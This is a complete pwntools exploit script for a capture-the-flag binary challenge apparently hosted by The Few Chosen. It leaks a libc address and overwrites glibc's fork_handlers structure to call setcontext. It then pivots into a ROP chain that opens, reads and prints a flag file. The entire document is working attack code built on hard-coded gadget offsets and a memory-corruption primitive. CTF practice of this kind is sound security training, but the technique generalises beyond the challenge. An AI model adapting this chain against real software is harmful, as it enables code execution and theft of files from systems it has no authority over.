#!/usr/bin/env python3

from pathlib import Path

from pwn import *


BASE_DIR = Path(__file__).resolve().parent
BINARY_PATH = BASE_DIR / "vuln_patched"
LIBC_PATH = BASE_DIR / "libc.so.6"

context.binary = elf = ELF(str(BINARY_PATH), checksec=False)
libc = ELF(str(LIBC_PATH), checksec=False)
context.log_level = "info"

HOST = "unbrevable-unbrevable-c5f28f01790422d6.challs.ctf.thefewchosen.com"
PORT = 1337


def start():
    if args.REMOTE:
        host = args.HOST or HOST
        port = int(args.PORT or PORT)
        return remote(host, port, ssl=True)

    if args.GDB:
        return gdb.debug(
            [str(BINARY_PATH)],
            gdbscript="""
            set pagination off
            continue
            """,
        )

    return process([str(BINARY_PATH)])


def build_payload(libc_base: int, path: bytes, read_fd: int) -> bytes:
    """Forge fork_handlers and enter an ORW ROP chain through setcontext."""
    fh = libc_base + 0x221AE0
    record = fh + 0x18

    # fork_handlers[0] is passed as rdi to prepare().  The prepare loop
    # decrements its index before selecting the record, hence count - 1.
    frame = fh + 0x100
    chain = fh + 0x400
    path_addr = fh + 0x540
    output = fh + 0x560
    mask = (1 << 64) - 1
    array = (record - (((frame - 1) << 5) & mask)) & mask

    payload = bytearray(b"\0" * 0x620)

    def qword(address: int, value: int):
        off = address - fh
        payload[off : off + 8] = p64(value)

    # ROPgadget starts this gadget at byte 0x45eaf, in the middle of a
    # prefixed instruction: 0x58 is `pop rax`, followed by `ret`.
    pop_rax = libc_base + 0x45EAF
    pop_rdi = libc_base + 0x2A3E5
    pop_rsi = libc_base + 0x2BE51
    pop_rdx_rbx = libc_base + 0x904A9
    syscall_ret = libc_base + 0x91316
    setcontext = libc_base + 0x539E0

    qword(fh, frame)
    qword(fh + 8, 0x30)
    qword(fh + 0x10, array)
    qword(record, setcontext)

    # ucontext_t fields consumed by glibc setcontext().
    qword(frame + 0xA0, chain)       # rsp
    qword(frame + 0xA8, pop_rax)     # r10 / initial jump target
    qword(frame + 0xE0, frame + 0x200)  # fpstate
    qword(frame + 0x1C0, 0x1F80)     # mxcsr

    rop = [
        # open(path, O_RDONLY, 0)
        2,
        pop_rdi, path_addr,
        pop_rsi, 0,
        pop_rdx_rbx, 0, 0,
        syscall_ret,
        # read(3, output, 0x100)
        pop_rax, 0,
        pop_rdi, read_fd,
        pop_rsi, output,
        pop_rdx_rbx, 0x100, 0,
        syscall_ret,
        # write(1, output, 0x100)
        pop_rax, 1,
        pop_rdi, 1,
        pop_rsi, output,
        pop_rdx_rbx, 0x100, 0,
        syscall_ret,
        # exit(0)
        pop_rax, 60,
        pop_rdi, 0,
        syscall_ret,
    ]
    rop_bytes = b"".join(p64(value) for value in rop)
    chain_off = chain - fh
    payload[chain_off : chain_off + len(rop_bytes)] = rop_bytes
    path_off = path_addr - fh
    payload[path_off : path_off + len(path)] = path

    if b"\n" in payload:
        raise ValueError("payload contains newline and would be truncated by fgets")
    return bytes(payload)


def exploit(io):
    leak_line = io.recvline(timeout=3)
    if not leak_line:
        raise RuntimeError("did not receive libc leak")
    try:
        leak = int(leak_line.strip(), 16)
    except ValueError as exc:
        raise RuntimeError(f"invalid libc leak: {leak_line!r}") from exc

    libc_base = leak - libc.sym["setvbuf"]
    if libc_base & 0xFFF:
        raise RuntimeError(f"unexpected libc base: {libc_base:#x}")
    log.info("setvbuf leak: %#x", leak)
    log.info("libc base: %#x", libc_base)

    path_text = args.PATH or ("flag" if args.REMOTE else "Dockerfile")
    path = path_text.encode() + b"\0"
    log.info("ORW path: %s", path_text)
    read_fd = 6 if args.REMOTE else 3
    log.info("flag fd: %d", read_fd)
    payload = build_payload(libc_base, path, read_fd)
    destination = libc_base + 0x221AE0
    log.info("fork_handlers: %#x", destination)
    log.info("payload length: %#x", len(payload))

    io.send(str(destination).encode() + b" " + str(len(payload) + 1).encode() + b" " + payload + b"\n")
    result = io.recvall(timeout=4)
    if args.REMOTE and b"{" not in result:
        raise RuntimeError(f"exploit did not return a flag: {result!r}")
    print(result.decode(errors="replace"), end="")


def main():
    io = start()
    exploit(io)


if __name__ == "__main__":
    main()
